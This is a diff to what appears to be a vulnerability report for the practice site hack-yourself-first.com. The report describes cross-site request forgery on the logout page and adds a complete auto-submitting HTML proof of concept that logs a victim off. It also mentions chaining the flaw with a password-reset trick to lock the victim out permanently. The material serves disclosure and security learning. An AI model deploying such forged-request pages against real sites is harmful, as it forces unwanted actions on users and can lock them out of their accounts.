@@ -3,3 +3,19 @@
 Summary: CSRF (Cross-Site Request Forgery) in logout page makes a victim to logout from their account
 Steps to reproduce: Click Log Off and capture the request in burp. Then right click on the request, click on engagement tools, and Generate CSRF PoC. In options, enable Include auto-submit script, and click Regenerate and copy the code and drop the request. Now, create a HTML file in your system and paste the copied CSRF PoC and save and run the file. Now you can see that you are logged off from your account.
 Impact: An attacker, after resetting password using #14 trick, can make a user logout and that makes permanent account lockout of the victim.
+
+If you do not have Burpsuite pro, then here is the CSRF PoC:
+
+
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://hack-yourself-first.com/Account/LogOff" method="POST">
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
